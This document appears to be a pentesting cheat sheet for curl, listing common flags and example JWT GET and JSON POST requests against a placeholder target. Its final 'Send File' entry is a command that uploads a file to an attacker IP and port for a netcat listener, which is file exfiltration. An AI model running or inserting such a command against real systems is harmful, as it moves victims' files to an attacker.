---
title: CURL
summary: A command line tool and library for transferring data with URL syntax.
description: A command line tool and library for transferring data with URL syntax.
---

**[https://github.com/curl/curl](https://github.com/curl/curl)**

## Basis


 > 
 > **<font color=red>curl</font> http://my.url**</br>
 > Get HTTP Content.

## Flags


 > 
 > **<font color=red>-s</font>**</br>
 > Silent (do not print curl info).
 > 
 > **<font color=red>-k</font>**</br>
 > Ignore HTTPS Errors.
 > 
 > **<font color=red>-i</font>**</br>
 > Show response Headers.
 > 
 > **<font color=red>-o</font> myFile**</br>
 > Save response in a file.

 > 
 > **<font color=red>-u</font> admin<font color=red>:</font>admin**</br>
 > Provide Credentials.

 > 
 > **<font color=red>-X</font> POST**</br>
 > Specifies method.
 > 
 > **<font color=red>-d</font>**</br>
 > POST data.

 > 
 > **<font color=red>-H '</font>myHeader: myValue<font color=red>'</font>**</br>
 > Set Header.

## GET Request with JWT


 > 
 > **<font color=red>curl '</font>http://\[TARGET_IP\]/api/book/1<font color=red>'  \\</font>**</br>
 > **<font color=red>-H 'Authorization: Bearer</font> \[JWT_TOKEN\]<font color=red>'</font>**</br>
 > Example GET request with JWT.

## Example POST Request with JSON Content


 > 
 > **<font color=red>curl '</font>http://\[TARGET_IP\]/api/auth/login<font color=red>' \\</font>**</br>
 > **<font color=red>-X POST \\</font>**</br>
 > **<font color=red>-H "Content-Type: application/json" \\</font>**</br>
 > **<font color=red>-d '{"</font>username<font color=red>":"</font>User<font color=red>","</font>password<font color=red>":"</font>P@ssw0rd<font color=red>"}'</font>**</br>
 > Example POST request with JSON content.

## Send File


 > 
 > **<font color=red>curl</font> \[ATTACKER_IP\]<font color=red>:</font>\[ATTACKER_PORT\]<font color=red> -F 'data=@</font>fmyFile<font color=red>'</font>**</br>
 > Send myFile to an netcat listener.
